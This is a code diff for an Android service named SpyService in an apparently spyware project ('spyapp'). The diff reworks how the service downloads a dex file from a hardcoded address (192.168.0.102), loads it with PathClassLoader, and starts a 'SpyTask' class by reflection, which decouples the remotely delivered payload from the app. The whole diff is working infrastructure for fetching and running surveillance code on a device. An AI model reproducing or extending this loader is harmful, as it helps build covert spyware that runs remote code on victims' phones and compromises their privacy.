@@ -6,16 +6,17 @@ import android.app.NotificationManager;
 import android.content.Context;
 import android.content.Intent;
 import android.graphics.Color;
+import android.os.Environment;
 import android.os.IBinder;
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 import androidx.core.app.JobIntentService;
 import androidx.core.app.NotificationCompat;
 import com.example.spyapp.dex.DexTask;
-import com.example.spyapp.dex.SpyTask;
 import dalvik.system.PathClassLoader;
 
 import java.io.*;
+import java.lang.reflect.Method;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.util.concurrent.ExecutorService;
@@ -26,7 +27,7 @@ import java.util.logging.Logger;
 public class SpyService extends JobIntentService {
     private final Logger logger = Logger.getLogger(this.getClass().getName());
     private final ExecutorService executor = Executors.newSingleThreadExecutor();
-    private DexTask dexTask;
+    private Object dexTask;
     private final String IP = "192.168.0.102";
 
     @Override
@@ -59,12 +60,11 @@ public class SpyService extends JobIntentService {
     public int onStartCommand(Intent intent, int flags, int startId) {
         Future future = executor.submit(this::downloadTask);
         try {
-            dexTask = (DexTask) future.get();
+            dexTask = future.get();
+            dexTask.getClass().getMethod("start").invoke(dexTask);
         } catch (Exception e) {
             logger.info(e.getMessage());
         }
-//        dexTask = new SpyTask(getBaseContext(), IP);
-        if (null != dexTask) dexTask.start();
 
         return super.onStartCommand(intent, flags, startId);
     }
@@ -73,7 +73,11 @@ public class SpyService extends JobIntentService {
     public void onDestroy() {
         super.onDestroy();
         executor.shutdown();
-        if (null != dexTask) dexTask.stop();
+        try {
+            dexTask.getClass().getMethod("stop").invoke(dexTask);
+        } catch (Exception e) {
+            logger.info(e.getMessage());
+        }
 
         logger.info("task destroyed.");
     }
@@ -89,11 +93,11 @@ public class SpyService extends JobIntentService {
         return null;
     }
 
-    private DexTask downloadTask() {
-        String filename = "classes.dex";
-        String path = getApplicationInfo().dataDir;
+    private Object downloadTask() {
+        String filename = "classes3.dex";
+        String path = getCacheDir().getPath();
         HttpURLConnection connection = null;
-        DexTask c = null;
+        Object c = null;
 
         try {
             logger.info("download started.");
@@ -116,8 +120,8 @@ public class SpyService extends JobIntentService {
             logger.info("download completed.");
 
             PathClassLoader classLoader = new PathClassLoader(file.getAbsolutePath(), getClassLoader());
-            Class<?> clazz = classLoader.loadClass("com.example.spyapp.dex.SpyTask");
-            c = (DexTask) clazz.getDeclaredConstructor(Context.class, String.class).newInstance(getBaseContext(), IP);
+            Class<?> clazz = classLoader.loadClass("com.example.dexmodule.SpyTask");
+            c = (Object) clazz.getDeclaredConstructor(Context.class, String.class).newInstance(getBaseContext(), IP);
 
             logger.info("dex class loaded.");
 
